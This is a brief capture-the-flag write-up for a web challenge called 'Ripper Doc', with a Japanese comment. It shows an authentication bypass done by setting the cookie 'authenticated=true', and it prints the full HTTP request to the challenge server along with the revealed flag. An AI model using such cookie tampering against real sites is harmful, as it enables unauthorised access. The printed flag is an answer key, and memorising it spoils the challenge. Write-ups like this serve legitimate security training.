# Ripper Doc

Find the flag in the ripper doc list.
http://167.71.246.232/
---
> Cookie: authenticated=true
cookieをTrueに書き換える

~~~
GET /certified_rippers.php HTTP/1.1
Host: 167.71.246.232
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://167.71.246.232/
Cookie: authenticated=true
Upgrade-Insecure-Requests: 1
Certified Rippers
~~~
~~~
Rippers:
     Don Sue Mei: dds123@example.com
     Lok Mah NoHans: llhsa@example.com
     Mr Flagerific: flag{messing_with_cookies}
~~~
![aa](https://github.com/xn16h7/CTF/blob/master/Tenable%20CTF%202021/img/%E2%91%A4.png)

## flag{messing_with_cookies}
